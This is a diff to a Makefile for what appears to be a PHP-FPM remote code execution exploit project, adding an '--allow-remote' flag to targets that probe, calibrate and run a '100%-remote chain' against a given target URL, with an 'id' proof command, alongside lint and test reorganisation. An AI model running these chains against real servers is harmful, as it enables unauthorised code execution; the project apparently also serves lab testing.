@@ -1,4 +1,4 @@
-.PHONY: help test lint secrets ci bootstrap inventory validate-profiles validate-fpm \
+.PHONY: help test lint ruff secrets ci bootstrap inventory validate-profiles validate-fpm \
         build-nginx build-php build-all profile-draft calibrate-remote remote \
         probe-remote remote-default matrix \
         labs-up labs-down labs-status labs-test \
@@ -13,13 +13,15 @@ help:                          ## Show this help
 test:                          ## Run the unit test suite
 	PYTHONDONTWRITEBYTECODE=1 python3 -m unittest discover -s tests -v
 
-lint:                          ## Run ruff on the Python tools and tests
-	ruff check tools tests
-
-secrets:                       ## Run gitleaks to detect leaked secrets
+lint:                          ## Run gitleaks to detect leaked secrets
 	gitleaks detect --source . --no-git --redact -v
 
-ci: lint test validate-profiles validate-fpm  ## Run the fast CI checks locally
+ruff:                          ## Run ruff on the Python tools and tests
+	ruff check tools tests
+
+secrets: lint                  ## Backwards-compatible alias for lint
+
+ci: ruff test validate-profiles validate-fpm  ## Run the fast CI checks locally
 
 bootstrap:                     ## Fetch and pin the upstream exploit
 	python3 tools/bootstrap_upstream.py
@@ -33,8 +35,7 @@ validate-profiles:             ## Validate every build profile against the gener
 	  from pathlib import Path; \
 	  [jsonschema.validate(json.loads(p.read_text()), schema) or print(f'  ok  {p.name}') \
 	   for p in sorted(Path('profiles').glob('*.json')) \
-	   if p.name not in ('schema.json', 'fpm-schema.json', \
-	                      'verification.json')]"
+	   if p.name not in ('schema.json', 'fpm-schema.json')]"
 
 validate-fpm:                  ## Validate the PHP-FPM profiles against the FPM schema
 	python3 -c "import glob, json, jsonschema; \
@@ -68,13 +69,13 @@ calibrate-remote:              ## Discover a profile over HTTP only (VERSION=...
 	@test -n "$(VERSION)" || \
 	  (echo "usage: make calibrate-remote VERSION=8.2.34 BASE=http://127.0.0.1:8406 BUILDER=http://127.0.0.1:8407"; exit 2)
 	python3 tools/php2shell_fpm.py --version "$(VERSION)" \
-	  --base "$(BASE)" --builder "$(BUILDER)" calibrate
+	  --base "$(BASE)" --builder "$(BUILDER)" --allow-remote calibrate
 
 remote:                        ## Run the 100%-remote chain (VERSION=... BASE=... BUILDER=...)
 	@test -n "$(VERSION)" || \
 	  (echo "usage: make remote VERSION=8.2.34 BASE=http://127.0.0.1:8406 BUILDER=http://127.0.0.1:8407"; exit 2)
 	python3 tools/php2shell_fpm.py --version "$(VERSION)" \
-	  --base "$(BASE)" --builder "$(BUILDER)" \
+	  --base "$(BASE)" --builder "$(BUILDER)" --allow-remote \
 	  --command "id>out/remote-$(VERSION)" --proof-file "out/remote-$(VERSION)" \
 	  no-oracle
 
@@ -82,13 +83,13 @@ probe-remote:                  ## Checklist of every chain precondition (VERSION
 	@test -n "$(VERSION)" -a -n "$(BASE)" || \
 	  (echo "usage: make probe-remote VERSION=8.4.26 BASE=http://target"; exit 2)
 	python3 tools/php2shell_fpm.py --version "$(VERSION)" \
-	  --base "$(BASE)" probe
+	  --base "$(BASE)" --allow-remote probe
 
 remote-default:                ## 100%-remote chain against a stock install (VERSION=... BASE=...)
 	@test -n "$(VERSION)" -a -n "$(BASE)" || \
 	  (echo "usage: make remote-default VERSION=8.4.26 BASE=http://target"; exit 2)
 	python3 tools/php2shell_fpm.py --version "$(VERSION)" \
-	  --base "$(BASE)" \
+	  --base "$(BASE)" --allow-remote \
 	  --command "id>out/remote-$(VERSION)" --proof-file "out/remote-$(VERSION)" \
 	  no-oracle
 
